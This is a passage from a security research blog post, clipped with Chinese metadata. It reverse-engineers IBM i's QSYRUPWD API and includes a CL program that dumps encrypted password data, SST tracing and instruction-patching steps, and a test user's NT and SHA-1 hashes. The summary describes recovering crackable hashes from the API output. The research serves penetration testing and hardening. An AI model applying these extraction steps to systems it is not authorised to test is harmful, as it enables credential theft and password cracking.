---
title: "The Cipher Behind QSYRUPWD: Reconstructing IBM i Password Hashes"
source: https://blog.silentsignal.eu/2026/07/28/the-cipher-behind-qsyrupwd-reconstructing-ibm-i-password-hashes/
source_host: blog.silentsignal.eu
clip_date: 2026-11-13T10:35:17+08:00
trace_id: b0df7784-1368-416b-8363-2993cbb665b5
content_hash: dd7b7c71ea0117e558f044730f9ef4a8d1ab26e9b015c3b8c8ee673fe9cbf489
status: synced
tags:
  - 密码学
  - Windows逆向
series: null
feed_source: Silent Signal·IBM i漏洞研究
ai_summary: IBM i 的 QSYRUPWD API 输出即使在高密码等级下也可被逆向解密为离线可破解的 DES/SHA-1/NT 凭据材料。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41775244-d011-8176-87c5-eecac8ae3eff
ioc:
  cves: []
  cwes: []
  hashes:
    - "00000000000000000000000000000000"
    - "0000000000000000000000000000000000000000"
    - "0000000000000000000000000000000000000000000000000000000000000000"
    - 00000000002f404040404040404040404040444575858894a7c2c5d9e2e4f1f6
    - 000000000040404040404040404040404040404040404044c4c5c5d4d6d9e2e4
    - 0843ad67cd610bfda2b47d196dbe0698
    - 0843ad67cd610bfda2b47d196dbe06980843ad67cd610bfda2b47d196dbe0698
    - 124c5a7db02d8acf63f74aa208cb5195
    - 17313763b4c60ec1c4e26fa32266195b
    - 25a0ab04bf53ecf5b837ed4ff665189a9ec18229
    - 2d8c32fbb32a5e4385629e700a4f9496
    - 38791bc974c0dd90d5e505f4e5124db1
    - "40404040404040404040404040404040"
    - "4040404040404040404040404040404040404040"
    - 4822bdc0c3f143547be52989ca747f8253b97367
    - 4822bdc0f143547b2989ca748253b97300000000000000000000000000000000
    - 53b973674822bdc089ca747ff143547b00000000000000000000000000000000
    - 53b9736789ca747f43547be522bdc0c3
    - 7a7086add7756695c2e347a9cbd0f685
    - 7b4bd4159a06900908f57ca0db0d19e8
    - 7caa42d89f384d9069636bb3069b3398
    - 8000000000000000ca0b86182600d7b0
    - 8000000000000000ca0b86182600eb10
    - 8000000000000000d9818947ec00eb10
    - 85234d0dd8977341e1c2858f78fb0554c5d5dde9b52447560c6ddeb0f08c99bf
    - 85bbb0f489ecb6193b4841ce617d93a6
    - 8c659794fe63a3f5c16853acfcb77e7f
    - aa61e3443f91d4904f4700df3856fe11
    - aca7145d3c3277397b3be11b8ae2ccbb
    - b01f949e6942108d3be55081a7aa61bc
    - b7ecca4fba7b8df96bf94c3a40751e3bc319c176
    - b89e7b4bd4159a06900908f57ca0db0d19e84048
    - b89eaca7145d3c3277397b3be11b8ae2ccbb4048
    - b8a515eb5e2e3b472e5dfe8b84c1cbd3
    - d150915577e448a10a86f1e5a8d35333
    - d167ee159904700a6bf4726cf2dcc549
    - d167ee159904700a6bf4726cf2dcc54985bbb0f489ecb6193b4841ce617d93a6
    - f15b8094c4372a8b24668cc6b96deee1
    - f70b30c86c0be8edba81d961ad6f9407
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> IBM i 的 QSYRUPWD API 输出即使在高密码等级下也可被逆向解密为离线可破解的 DES/SHA-1/NT 凭据材料。
> 
> - **背景：** 渗透测试发现 QPWDLVL 2–4 时，John the Ripper 现有 IBM i 格式（as400_des/as400_ssha1）无法直接匹配 QSYRUPWD 输出，导致持有 *ALLOBJ+*SECADM 权限也无法做密码强度测试。
> - **方法：** 通过 CL 程序调用 QSYRUPWD、STRTRC 追踪、SST 转储并反汇编 QSYRUPWD/QSYRUPWD 等 *SRVPGM，发现关键运算通过 SCV 10（功能号 346 = CIPHER MI 指令）交给 LIC 模块 QZLSRTPW；再用 SST 补丁两指令死循环（ori r0,r0,0 + b 回跳）当断点，逐个观察 CIPHER 的寄存器与控制结构。
> - **算法链：** QSYRUPWD 输出由 3 次 CIPHER 组成：1) SHA-1(EBCDIC 用户名 || 0002 || NT hash(密码)=MD4(UTF-16LE(密码)) ×2)；2) MD5(EBCDIC 用户名) 得 32 字节 IV；3) 用用户 DES 密码值和用户名构造 32 字节密钥做 Rijndael-256(32 字节块) CBC 加密上述输入。
> - **QSYRUPWD 内部：** 对自身第一次 CIPHER 的 20 字节 SHA-1 输出做 4×4 字节切片重排（前向序 D[1..4]||D[6..9]||D[11..14]||D[16..19] 与逆序变体、D[17..20]||D[12..15]||D[6..9]||D[1..4]）派生 16 字节 AES-128 密钥，分别 ECB 解密还原 DES 值和 SHA-1，并用 AES-128/CBC 链可从 QZLSRTPW 192 字节块解出 NT hash。
> - **验证与影响：** 编写 Python 脚本从 QSYRUPWD 原始输出直接恢复 John the Ripper 可用的 as400-des/as400-ssha1/NT 格式，QPWDLVL 4 下 DES/SHA-1 字段为空仍能仅凭 EBCDIC 用户名（补 0x00/0x40、0x44 及排序非填充字符）派生 Rijndael 密钥解出 NT hash；RTX 4090 实测 NTLM 达 288.5 GH/s，PBKDF2 9999 迭代仅 2.13 MH/s（差约 13.5 万倍），建议严格限制同时持有两权限的配置并避免跨系统密码复用。

## Intro

QSYRUPWD (Retrieve Encrypted User Password) is an IBM i API that returns password-related data for a specified user profile in encrypted form to authorized callers. IBM i is IBM’s integrated enterprise platform, originating from the AS/400 line, and is still widely used for business-critical workloads such as ERP, finance, logistics, and manufacturing. The API primarily exists to support system functions such as password synchronization, migration, replication, and other administrative scenarios where password material must be transferred without exposing the cleartext password. IBM documents QSYRUPWD as part of its security-related API set for handling encrypted password data.

During one of our IBM i penetration tests, I noticed that the client’s server was configured with `QPWDLVL = 2`. On IBM i, the [QPWDLVL](https://www.ibm.com/docs/en/i/7.5.0?topic=passwords-password-level-qpwdlvl) system value determines both the password rules accepted by the operating system and the verifier formats maintained for authentication compatibility. IBM documents that password levels 0 and 1 correspond to the older DES-based scheme, [levels 2 and 3](https://www.ibm.com/docs/en/i/7.5.0?topic=passwords-password-level-qpwdlvl) use a SHA-1-based scheme, and [level 4](https://www.ibm.com/docs/en/i/7.5.0?topic=passwords-password-level-qpwdlvl) introduces a PBKDF2-based verifier model. IBM also states that when `QPWDLVL` is set to 2, the operating system keeps compatibility with multiple password-verifier forms rather than removing earlier ones.

This distinction is important when interpreting `QSYRUPWD` output. John the Ripper includes dedicated IBM i cracking formats for legacy IBM i material, specifically `as400_des` and `as400_ssha1`, which reflects support for the older DES-based and salted SHA-1-based representations. However, in our testing, the `QSYRUPWD` output obtained from systems running at QPWDLVL 2–4 did not match the form expected by John the Ripper’s IBM i formats, whereas the legacy QPWDLVL 0–1 case is compatible with the QSYRUPWD-derived material handled by those modules. In other words, for QPWDLVL 2–4, the content returned by `QSYRUPWD` changes in a way that makes direct use with the existing John the Ripper IBM i formats unsuccessful. This is an empirical observation from our testing and tooling analysis, not a claim that IBM publicly documents the exact returned structure for those levels.

As a result, even with `*ALLOBJ` and `*SECADM` (which are required to call `QSYRUPWD`), the API could no longer be used for practical password-strength testing. After this engagement, I decided to analyze the `QSYRUPWD` API in detail.

## Tools

To examine the API behavior directly, I wrote a small CL program that invokes `QSYRUPWD` with the `UPWD0100` format, retrieves the returned buffer, and emits it for further analysis. The goal was not to build a full extraction tool, but to verify what kind of password-related data the API returns under different `QPWDLVL` settings. This made it possible to compare the actual output format across systems and determine whether the returned data matched the input expected by existing cracking tools such as John the Ripper.

```java
PGM PARM(&USER)                                                           
    DCL VAR(&USER) TYPE(*CHAR) LEN(10)                                        
    DCL VAR(&RCV) TYPE(*CHAR) LEN(4000)                                       
    DCL VAR(&LEN) TYPE(*INT) LEN(4) VALUE(4000)                               
    DCL VAR(&FMT) TYPE(*CHAR) LEN(8) VALUE('UPWD0100')                        
    DCL VAR(&ERR) TYPE(*CHAR) LEN(8) VALUE(X'0000000000000000')                                               
    DCL VAR(&N) TYPE(*INT) LEN(4)                                             
    DCL VAR(&N4) TYPE(*CHAR) LEN(4)                                           
    DCL VAR(&NCH) TYPE(*CHAR) LEN(11)                                         

    CALL PGM(QSZS/QSYRUPWD) PARM(&RCV &LEN &FMT &USER &ERR)                   
       MONMSG CPF0000 EXEC(DO)                                                
            SNDPGMMSG MSGID(CPF9898) MSGF(QCPFMSG) MSGDTA('QSYRUPWD failed') MSGTYPE(*ESCAPE)                                                       
       RETURN                                                                 
       ENDDO                                                                  

    CHGVAR VAR(&N4) VALUE(%SST(&RCV 1 4))                                     
    CHGVAR VAR(&N) VALUE(%BIN(&N4))                                           
    CHGVAR VAR(&NCH) VALUE(%CHAR(&N))                               
    SNDPGMMSG MSGID(CPF9898) MSGF(QCPFMSG) MSGDTA('QSYRUPWD ok, bytes:' *BCAT &NCH) MSGTYPE(*INFO)        
    SNDPGMMSG MSGID(CPF9898) MSGF(QCPFMSG) MSGDTA('Data: ' *BCAT &RCV) MSGTYPE(*INFO)                     
ENDPGM
```

## Trace

After I compiled the `PWDDUMP` program, I wondered whether we could generate a call trace. Luckily, IBM i provides a tool called `STRTRC` that can be used to collect evidence about the calls made within `QSYRUPWD`. So I logged in with a user that has `*ALLOBJ` and `*SECADM` authority (required to run `PWDDUMP`), and ran the following commands:

```
STRTRC SSNID(MYTRACE) JOB(*ALL/QSECOFR/QPADEV0005) JOBTRCTYPE(*ALL)
CALL USERB1/PWDDUMP USERB1
ENDTRC SSNID(MYTRACE) PRTTRC(*YES)
PRTTRC  DTALIB(QGPL) DTAMBR(MYTRACE)
```

These commands create a spool file with the required call-trace information, but the structure is a bit confusing at first glance, here is a sample snippet of the spool file:

```sql
|         |    SYNCHRONOU
                                                                                                   CALL  |   CPU   |   READS |  WR

TIME            THREAD    FLAG  FUNCTION PROGRAM                       LIBRARY     ENTRY   EXIT    LVL   |   TIME  |  DB  NDB|  DB
----------------------------------------------------------------------------------------------------------------------------------
12:53:35.829041 00000065        CALL     QCMD                          QSYS       x000519 x000519     1     .000000    0    0    0
12:53:35.829041 00000065        CALL     QUICMENU                      QSYS       x0000C1 x0000C1     2     .000000    0    0    0
12:53:35.829041 00000065        CALL     QUIMNDRV                      QSYS       x00061E x00061E     3     .000000    0    0    0
12:53:35.829041 00000065        CALL     QUIMGFLW                      QSYS       x0004D9 x0004D9     4     .000000    0    0    0
12:53:35.829041 00000065        CALL     QUICMD                        QSYS       x00056F x00056F     5     .000000    0    0    0
12:53:35.829041 00000065        XCTL     QSCSNTRC                      QSYS       x000A70 x000A70     6     .000000    0    0    0
12:53:35.829041 00000065        CALL     QCMDEXC                       QSYS       x00012F x00012F     7     .000000    0    0    0
12:53:35.829041 00000065        XCTL     QYPESTRP                      QSYS        000000  000000     8     .000000    0    0    0
```

I wrote a scraper that converts the raw spool file content into a more readable format, for example:

```rust
PWDDUMP / PWDDUMP
QCLRSLV
QCLCLCPR -> QMHSNDPM -> return PWDDUMP
QSYRUPWD / QSYRUPWD
QLEIT / Q LE sinit_processor -> itl_callInit__FPV12ITL_COM_AREA -> QPWFSMONOC -> return QSYRUPWD
QZLSRTPW / _CXX_PEP__Fv -> main
QZLSSRV1 / QzlsGetNTPassword__FPcP15QzlsNTPasswords
QSYSERV / QSYSRVRTV / qsy_rtv_user_ent__FPCcN21CcCiP20_qsy_serv_rtn_data_TPi
QSYSERV / QSYSRVUTL / caller_is_authorized__FPCcPcPPvCs
QSYMIUTLS / QSYGETSYP /
    qsy_getSYP__FPCcT1C11_OBJ_TYPE_TPPvPs
    qsy_getSYP_long__FPCcT1C11_OBJ_TYPE_TPPvPs
QSYAUTUTLS / QSYCHKAUT /
    qsy_chkaut__FPvsT2cPs
    qsy_chkaut__FPvsT2cT4Ps
QSYMIUTLS / QSYTESTAU / qsy_testau__FPvsT2Ps
return QSYSERV / QSYSRVRTV / qsy_rtv_user_ent__FPCcN21CcCiP20_qsy_serv_rtn_data_TPi
QSYSERV / QSYSRVRTV / rtv_user_entries__FPCcN21CcCiP20_qsy_serv_rtn_data_TPi
QSYSERV / QSYSRVUTL / get_security_index__FPCcPPv
QSYMIUTLS / QSYGETSYP /
    qsy_getSYP__FPCcT1C11_OBJ_TYPE_TPPvPs
    qsy_getSYP_long__FPCcT1C11_OBJ_TYPE_TPPvPs
QSYMIUTLS / QSYMATSOBJ / qsy_matsobj__FPvP16_MSOB_Template_TPs
return QSYSERV / QSYSRVRTV / rtv_user_entries__FPCcN21CcCiP20_qsy_serv_rtn_data_TPi

QSYSERV / QSYSRVRTV / qsy_rtv_user_ent__FPCcN21CcCiP20_qsy_serv_rtn_data_TPi
QSYSERV / QSYSRVRHS / returnIndividualEntry__FPCcT1P20_qsy_serv_user_ent_T
QSYSERV / QSYSRVRHS / process2__FP20_qsy_serv_user_ent_T
QSYSERV / QSYSRVRHS / unhide_edata__FPcsP20_qsy_serv_user_ent_T
QSYSERV / QSYSRVRHS / get_offset__FP20_qsy_serv_user_ent_TPi 
QSYMIUTLS / QSYCIPHER / qsy_cipher__FPvP17_CIPHER_Control_TT1Ps
return QSYSERV / QSYSRVRHS / unhide_edata__ -> process2__
QSYCODEUTL / QSYAESFNC / qsy_aes_decrypt__FPcsT1T2PsT1 
    QSYMIUTLS / QSYCIPHER / qsy_cipher__FPvP17_CIPHER_Control_TT1Ps
    QSYMIUTLS / QSYCIPHER / qsy_cipher__FPvP17_CIPHER_Control_TT1Ps
    return:

QSYSERV / QSYSRVRHS / process2__FP20_qsy_serv_user_ent_T
QSYSERV / QSYSRVRHS / returnIndividualEntry__FPCcT1P20_qsy_serv_user_ent_T
QSYSERV / QSYSRVRTV / qsy_rtv_user_ent__FPCcN21CcCiP20_qsy_serv_rtn_data_TPi
QZLSSRV1 / QzlsGetNTPassword__FPcP15QzlsNTPasswords
QZLSRTPW
QSYRUPWD
PWDDUMP
```

Reviewing the output, I immediately focused on the following symbols because their names strongly suggested cryptographic processing, including generic cipher operations, AES-related functionality, and decryption routines:

```
QSYMIUTLS / QSYCIPHER / qsy_cipher__FPvP17_CIPHER_Control_TT1Ps
QSYCODEUTL / QSYAESFNC / qsy_aes_decrypt__FPcsT1T2PsT1
```

## Disassembly

I used `System Service Tools (SST)` to dump the assembly code of the `QSYMIUTLS`, `QSYCODEUTL`, `QZLSRTPW`, and `QSYRUPWD` \*SRVPGM objects into spool files. System Service Tools (SST) is an IBM i service interface that provides low-level diagnostics, debugging, and service functions. It helps administrators and support teams investigate system problems by collecting internal details like logs, memory dumps, and hardware/status information. It is mainly used for troubleshooting when normal IBM i tools do not show enough detail. For debugging, SST is especially useful because it supports deep inspection of system state, including collecting service data and generating dumps that capture memory and runtime context for later analysis. To access SST, your IBM i user profile must have `*SERVICE` authority, and you must use separate credentials in the SST environment. SST uses its own user management, independent from the operating system profiles, so the QSECOFR password in SST may be different from the operating system QSECOFR password. I used the following commands to dump the assembly code:

```sql
strsst
    Login with your SST user
    Start a service tool (1)
    Display/Alter/Dump (4)
    Dump to printer (2)
    Machine Interface (MI) object (1)
    Program (02) (2)
    Find by object name and context name (1)
        On the next screen under the Object group screen filled with the name of the *SRVPGM e.g.: QSYMIUTLS
        Change the subtype to 03 it means *SRVPGM instead of *PGM object which is 01
        Under the Context group screen filled with the name of the library contains the *SRVPGM e.g.: QSYS
        If everything set up properly just press 2 enters and you got a new menu.
    Disassembled code (3)
        Fill the "Dump title" and press enter, the spool file will be ready in a second
```

## Supervisor Call Vectored (SCV)

I examined the dumps, focusing on the `qsy_aes_decrypt__FPcsT1T2PsT1` and `qsy_cipher__FPvP17_CIPHER_Control_TT1Ps` functions. I looked for explicit cryptographic operations in the disassembled code, such as recognizable software implementations of block-cipher rounds, key-schedule generation, or direct calls to documented cryptographic APIs, but I did not find any. Instead, the code appeared to delegate the sensitive work to lower-level routines. The `qsy_cipher__FPvP17_CIPHER_Control_TT1Ps` function contains the following code:

```
3343436176 006554     000074    3940015A          ADDI 10,0,346
3343436176 006558     000078    EBC20038          LD 30,0X38(2)
3343436176 00655C     00007C    387D0020          ADDI 3,29,32
3343436176 006560     000080    38BD0040          ADDI 5,29,64
3343436176 006564     000084    7F83E888          TD 28,3,29
3343436176 006568     000088    7C23E880          CMPLA 0,3,29
3343436176 00656C     00008C    78031B9A          SELIR 3,0,3,39
3343436176 006570     000090    7F85E888          TD 28,5,29
3343436176 006574     000094    E35D0032          LQ 26,0X30(29),2
3343436176 006578     000098    7C25E880          CMPLA 0,5,29
3343436176 00657C     00009C    7B64049C          SELRI 4,27,0,41
3343436176 006580     0000A0    78052B9A          SELIR 5,0,5,39
3343436176 006584     0000A4    44000141          SCV 10
```

On IBM i, `SCV (Supervisor Call Vectored)` is a system call mechanism: a program executes the scv instruction to switch into privileged IBM i/LIC code so the operating system can perform work that user programs cannot do directly. Many low-level MI functions are executed through SCV 10. Based on `Leif Svalgaard’s MI Programming` materials, especially Chapter 18 on SCV (Supervisor Call Vectored) and the appendix listing SCV 10 function numbers, this model uses R10 as a function selector for SCV 10, while the arguments are passed in the general-purpose registers beginning with R3. In other words, R10 identifies which internal service routine is requested, and the remaining argument registers carry the parameters for that service. In this case, `346 (ADDI 10,0,346)` is the decimal function number, but based on the number alone I did not know which internal function it represented. Chapter 18 of `Leif Svalgaard’s MI Programming` book describes a simple way to identify the specific function. `SCV 10` is implemented in a LIC module named `.#cfmir`, so its low-level assembly stub can be inspected with `SST (System Service Tools)`:

```sql
strsst
    Login with your SST user
    Start a service tool (1)
    Display/Alter/Dump (4)
    LIC module (3)
    Find LIC module by name (1)
        Module name  . . . . . : #cfmir
```

After pressing Enter on the `"Find LIC module"` screen, I could see that on my IBM i 7.5 system the SCV 10 handler starts at `FFFFFFFFFF005000`. In this case, SST did not provide a `"Disassembled code"` menu option—only `"Hexadecimal, alter capable"` and `"Base structure"`. After selecting `"Hexadecimal, alter capable,"` SST displayed a hex dump of the LIC routine. SST also has a rarely-documented feature that can be used to view disassembly. In the memory dump screen, you can place the cursor on any displayed 32-bit word, type the letter `i`, and press Enter. SST will interpret the selected bytes as instructions and display the corresponding disassembly at that location. Below is the relevant part of the `.#cfmir` LIC routine:

```yaml
5000   3C408003   addis 2,0,-32765  // R2=FFFFFFFF80030000 (-32765 = 0x8003, SIMM << 16 = 0x80030000)
5004   FBC1FFF3   stmd 30,0xfff0(1)
5008   7C0802A6   mfspr 0,8
500C   F8010028   std 0,0x28(1)
5010   F821FF41   stdu 1,0xff40(1)
5014   3C000010   addis 0,0,16
5018   F8010008   std 0,0x8(1)  
501C   40D60134   bc 6,22,0x134
5020   7D7142A6   mfspr 11,273
5024   EBE10000   ld 31,0x0(1) 
5028   EBFF0000   ld 31,0x0(31)
502C   EBFF0028   ld 31,0x28(31)
5030   800B00B0   lwz 0,0xb0(11)
5034   7FC000A6   mfmsr 30 
5038   70000400   andi. 0,0,1024
503C   408201A5   bcl 4,2,0x1a4 
5040   40F40020   bc 7,20,0x20
5044   FBE10080   std 31,0x80(1)
5048   F9410088   std 10,0x88(1)
504C   39410080   addi 10,1,128 
5050   3960448F   addi 11,0,17551
5054   4B0180E3   bla 0x30180e0 
5058   3C408003   addis 2,0,-32765
505C   E9410088   ld 10,0x88(1) 
5060   E982CB40   ld 12,0xcb40(2)  // (1)
5064   282A01BA   cmpli 0,1,10,442
...
5094   E982CB38   ld 12,0xcb38(2)  // (2)
```

From the disassembly, the prologue typically starts by initializing the TOC pointer in R2. On Power systems, the TOC (Table Of Contents) is a base-addressed data structure used to access global data, constants, and function pointers. For example, `addis 2,0,-32765` sets up R2 as `FFFFFFFF80030000`. This looks surprising at first, but it follows from how addis works on PPC64: the 16-bit immediate is interpreted as a signed value (here -32765, which is 0x8003 in 16-bit two’s complement), then shifted left by 16 (`0x8003 << 16 = 0x80030000`). Because this value has the high bit set in the 32-bit result (0x80030000), the processor sign-extends it when writing into a 64-bit register, producing `FFFFFFFF80030000` (the upper 32 bits become FFFFFFFF). Later, the code uses a TOC-relative load like `ld 12,0xcb38(2)` (comment (2)). Because the displacement 0xCB38 has its highest bit set (0xCB38 ≥ 0x8000), it is treated as a negative signed 16-bit offset. Converting it gives `0xCB38 = -0x34C8 (0x10000 - 0xCB38 = 0x34C8)`, so the effective address becomes: `EA = FFFFFFFF80030000 + (-0x34C8) = FFFFFFFF8002CB38`.

Based on Leif Svalgaard’s SCV documentation, especially the material describing the `SCV 10` handler and the appendix of `SCV 10` function numbers, at that address, the dump shows pointers that lead to the base of the `SCV 10` function table, for example `FFFFFFFF8403C910` (base pointer). Once you have the base pointer, the dispatch is indexed by the selector in R10. Since the table holds 8-byte pointers, the offset is `R10 * 8`. For `R10 = 346`, this is `346 * 8 = 2768 = 0xAD0`, so:

```
base + 0xAD0 = FFFFFFFF8403C910 + 0xAD0 = FFFFFFFF8403D3E0.
```

The entry at `FFFFFFFF8403D3E0` resolves to the function pointer `FFFFFFFFC1F2FD90`, which corresponds to `#crciphr` if I select the `"Find LIC module by address"` in SST. Back in Leif Svalgaard’s MI Programming book, I checked Appendix E (“SCV 10 Function Numbers”), which shows that #crcipher corresponds to the [CIPHER MI function](https://www.ibm.com/docs/en/i/7.5.0?topic=instructions-cipher-cipher).

At this point, I reviewed the disassembly dumps of the relevant `*PGM` and `*SRVPGM` objects from the trace and identified all SCV 10 calls with function number 346 (CIPHER):

-   QSYRUPWD \*PGM
-   QZLSRTPW \*PGM
-   QSYMIUTLS \*SRVPGM

## Debugging

SST is not a full debugger, it is far from something like GDB but I was still able to use it for debugging. It can attach to a task or process and display the general-purpose registers, but it does not support convenient instruction-level single stepping and does not offer easy, debugger-style breakpoint handling. In principle, a breakpoint can be emulated by rewriting the target instruction, but catching the triggered trap and resuming execution cleanly is considerably less straightforward. I needed a workaround to create my own breakpoints, so I used the following approach:

1.  Duplicate the relevant \*PGM and \*SRVPGM objects into a debugging library (for example, QSZS).
2.  Rewrite the required object references from QSYS to QSZS in the \*PGM and \*SRVPGM objects using SST, unless those references already use \*LIBL. This allows the modified program objects to run against the copied targets while leaving the original IBM-supplied objects intact.
3.  Add the debugging library (QSZS) to the top of the library list using the CHGSYSLIBL CL command.
4.  Modify the assembly code by inserting an infinite loop to mimic a breakpoint.
5.  Run the PWDDUMP program in terminal B (QPADEV0005).
6.  Run SST in terminal A (QPADEV0004) and attach to the process running on QPADEV0005: Start a service tool (1) -> Display/Alter/Dump (4) -> Display/Alter storage (1) -> Tasks/Processes (4) -> Process (2) -> Display list of processes (5) -> Select the process that starts with QPADEV0005.

### Poor man’s breakpoint

I would have liked to see the parameters of the CIPHER MI function, so I decided to patch the SCV instruction. A simple breakpoint technique is to modify the code into a two-instruction infinite loop:

```
ori   r0, r0, 0      ; 60000000  (NOP-like)
b     loop           ; 4BFFFFFC  (branch back to the ori)
```

I use `ori r0, r0, 0` because it is effectively a NOP: it computes `r0 = r0 OR 0`, so R0 does not change. On PowerPC, the plain ori instruction also does not update condition flags, so it does not change the condition register either. The next instruction is an unconditional branch (b) that jumps back by 4 bytes (0x4BFFFFFC), returning to the ori. As a result, the CPU gets stuck spinning at a known address, which makes it easy to attach a debugger/trace and observe registers and memory at the point where execution was “looped”. Like I mentioned in the `"Disassembled code"` section of this whitepaper, I have to select the menu option `"1. Hexadecimal, alter capable"` in the SST but keep it mind, the context should be `QSZS`.

### Unravel the CIPHER chain step by step

I am going to describe the shortest path through the reverse engineering process, without the dead ends, issues, or problems I encountered.

#### QZLSRTPW 1st CIPHER

On my system, based on the disassembly of the QZLSRTPW \*PGM, the first CIPHER call is here:

```
235B8A8762 002534     000474    3940015A          ADDI 10,0,346
235B8A8762 002538     000478    44000141          SCV 10                                // CIPHER 
235B8A8762 00253C     00047C    E8410020          LD 2,0X20(1)
```

In SST, this instruction sequence can be patched at the address identified above. On the analyzed system, this is done by entering `235B8A8762 002534` in the Address fields and replacing the original instruction pair `44000141 E8410020` with `60000000 4BFFFFFC`, then pressing F11 twice to apply the change. The high-order part of the address (235B8A8762) is system-specific and may vary across systems, while the low-order offset (002534) remains the same for this code location. If everything is successful, the breakpoint is set.

From terminal B, I ran `CALL USERB1/PWDDUMP USERB1`. If everything is in place, the program will hang. After that, from terminal A, I attached SST to the process running in terminal B (QPADEV0005). After selecting “Disassembled code for cursor” in SST, I could see something like this:

```
ISF ADDRESS   EB7A4C7A2F FFD360       TYPE MI PROC                   
    RESUMEPOINT     235B8A8762 0023B8     ENTRY@    235B8A8762 0020C0
     PROGRAM  QZLSRTPW                                               
     ENTRY    main + 000002F8                                        
ISF ADDRESS   EB7A4C7A2F FFD4E0       TYPE MI PEP                    
    RESUMEPOINT     235B8A8762 001EE8     ENTRY@    235B8A8762 001C40
     PROGRAM  QZLSRTPW                                               
     ENTRY    _CXX_PEP__Fv + 000002A8
```

This is a call stack, and as you can see, we are in the relevant function. If we search for the `QZLSRTPW` string on the same screen, we can identify the relevant registers and values at the point where the program is looping. Based on the `CIPHER` instruction syntax defined by the [IBM](https://www.ibm.com/docs/en/i/7.5.0?topic=instructions-cipher-cipher) page:

```
CIPHER (
    receiver   : address of space pointer(16)
    controls   : address
    source     : address of space pointer(16)
)
```

The relevant register values can be viewed on the same SST screen, by paging down to the register section of the selected `QZLSRTPW` job. The values of interest in my case were:

```objectivec
GPR 3     CA0B861826 00E8C0 // receiver
GPR 4     CA0B861826 00EAD0 // control struct
GPR 5     CA0B861826 00E890 // input
```

GPR 3 (CIPHER receiver/output): In the memory area pointed by R3, the following pointer can be found:

```
E8C0    80000000 00000000      CA0B8618 2600EA4C
```

In the memory area referred by the pointer above, the following data is stored:

```
EA40    00000000 00000000      00000000 00000000
EA50    00000000 00000000      00000000 00000000
```

I stopped the program flow before the CIPHER rutine therefore this memory segment is not important at this point.

GPR 4 (CIPHER struct): In the memory area pointed by R4:

```
EAD0    00050100 000000AC      00000000 00000000
EAE0    80000000 00000000      CA0B8618 2600EB10
EAF0    00000000 00000000      00000000 00000000
EB00    00000000 00000000      00000000 00000000
EB10    00000000 00000000      00000000 00000000
EB20    00000000 00000000      00000000 00000000
EB30    00000000 00000000      00000000 00000000
EB40    00000000 00000000      00000000 00000000
EB50    00000000 00000000      00000000 00000000
EB60    00000000 00000000      00000000 00000000
EB70    00000630 00000000      00000000 00000000
EB80    00000000 00000000      00000020 00000000
EB90    98000000 00000000      05E08100 46010000
EBA0    00000000 00000000      00000000 00000000
EBB0    00000000 00000000      00000000 00000000
EBC0    00000000 00000000      0000D800 00000000
```

This is quite an interesting structure, and according to the `CIPHER` documentation, it does this:

```sql
Offset 0x00–0x01 (Function identifier): 0x0005 (one-way hash / HMAC)
Offset 0x02 (Hash algorithm): 0x01 (SHA-1)
Offset 0x03 (Sequence): 0x00 (Only)
Offset 0x04–0x07 (Data length, UBin(4)): 0x000000AC (172 bytes)
Offset 0x08 (Output): 0x00 (Hash)
Offset 0x09–0x0F (Reserved/ignored, 7 byte): 00000000000000
Offset 0x10–0x1F (Hash context, space pointer, 16 byte): 8000000000000000CA0B86182600EB10
Offset 0x20–0x2F (HMAC key, space pointer, 16 byte): 00000000000000000000000000000000 (NULL)
Offset 0x30–0x33 (HMAC key length, UBin(4)): 0x00000000
Offset 0x34–0x5F (Reserved/ignored padding a 96-byte controls): 00000000000000000000000000000000000000000000000000000000000000000000000000000000
```

GPR 5 (CIPHER input): In the memory area pointed by R5, the following pointer can be found:

```
E890    80000000 00000000      CA0B8618 2600E9A0
```

In the memory area referred by the pointer above, the following data is stored:

```
E9A0    E4E2C5D9 C2F14040      40400000 00000000
E9B0    00000000 00000000      00000000 00000000
E9C0    00000000 00000000      00000000 00000000
E9D0    00000000 00022D8C      32FBB32A 5E438562    // 0002 prefix and NT hash of the plain password twice: NT(password) = MD4( UTF-16LE(password) )
E9E0    9E700A4F 94962D8C      32FBB32A 5E438562
E9F0    9E700A4F 94960000      00000000 00000000
EA00    00000000 00000000      00000000 00000000
EA10    00000000 00000000      00000000 00000000
EA20    00000000 00000000      00000000 00000000
EA30    00000000 00000000      00000000 00000000
EA40    00000000 00000000      00000000 00000000
```

The most interesting part is the 16-byte value beginning at E9D6, preceded by the constant prefix 0002:

```
0002 2D8C32FBB32A5E4385629E700A4F9496
```

I knew based on the call stack of the program object there was a `QzlsGetNTPassword__FPcP15QzlsNTPasswords` function call somewhere before. The quickest check was to fire up John the Ripper and create a wordlist file containing the USERB1 user’s password. This was the fastest win in the whole reverse engineering process:

```
NT hash(userb1) = 2D8C32FBB32A5E4385629E700A4F9496 (E9D6 - E9E5)
```

Based on multiple runs with different users 0x002 is a static prefix.

I calculated the results of this CIPHER operation, as I wanted to be sure IBM did not modify anything in the SHA-1 algorithm:

```
B7ECCA4FBA7B8DF96BF94C3A40751E3BC319C176
```

I then removed the breakpoint and placed another one after the SCV call so I could inspect the receiver buffer after the CIPHER operation had completed. The goal was to observe exactly what value the system wrote to the output area and compare it with the result of my manually reproduced CIPHER calculation. The data pointed to by the pointer stored at the memory address referenced by R3 was as follows:

```
EA40    00000000 00000000      00000000 B7ECCA4F
EA50    BA7B8DF9 6BF94C3A      40751E3B C319C176
```

The program’s calculation and my calculation are identical so the standard SHA-1 algorithm is used.

#### QZLSRTPW 2nd CIPHER

Clearing the current breakpoint or rewriting the original instructions and creating another breakpoint on the second SCV 10 function with 346 as function number:

```
235B8A8762 0026A8     0005E8    3940015A          ADDI 10,0,346
235B8A8762 0026AC     0005EC    44000141          SCV 10                                / 2. CIPHER
235B8A8762 0026B0     0005F0    E8410020          LD 2,0X20(1)
235B8A8762 0026B4     0005F4    387B0210          ADDI 3,27,528                         110
```

The debug method is the same as with the previous case, attaching to the proper process on terminal B (QPADEV0005) and checking the registers:

```
GPR 3     D9818947EC 00E8B0 // output
GPR 4     D9818947EC 00EAD0
GPR 5     D9818947EC 00E8A0
```

GPR 3 (CIPHER receiver/output): In the memory area pointed by R3, the following pointer can be found:

```
E8B0    80000000 00000000      D9818947 EC00EA60
```

GPR 4 (CIPHER struct): In the memory area pointed by R4:

```
EAD0    00050000 0000000A      00000000 00000000
